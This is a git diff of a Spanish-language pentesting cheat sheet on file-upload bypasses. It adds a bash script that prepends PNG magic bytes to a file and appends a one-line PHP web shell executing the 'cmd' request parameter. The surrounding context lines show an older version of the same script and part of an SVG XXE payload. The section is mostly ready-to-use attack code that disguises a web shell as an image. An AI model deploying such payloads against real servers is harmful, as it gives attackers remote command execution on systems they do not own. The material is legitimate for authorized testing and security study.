@@ -64,7 +64,11 @@ done
 <svg>&xxe;</svg>
 ```
 
+-----
+
 ### Magic bytes attack
+
+
 - Se puede intentar subir un archivo con magic bytes que hagan que el servidor lo interprete como un archivo diferente.
 - [más info](https://en.wikipedia.org/wiki/List_of_file_signatures)
 - [más info x2](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)
@@ -78,8 +82,22 @@ AAAA
 - Cambiamos el mymetype utilizando hexeditor, poniendo los numeros magicos reemplazando los valores AAAA: `FF D8 FF DB`
 ```
 - También para PNG se puede hacer lo siguiente:
+
 ```bash
 #!/bin/sh
 echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
 echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
+```
+
+----
+
+- Alternativa
+
+```bash 
+
+#!/bin/bash
+# Crear el encabezado PNG (opcional si se necesita disfrazar como imagen)
+echo -ne '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > mime_shell.php.png
+# Agregar el código PHP correctamente escapado
+echo '<?php system($_REQUEST["cmd"]); ?>' >> mime_shell.php.png
 ```
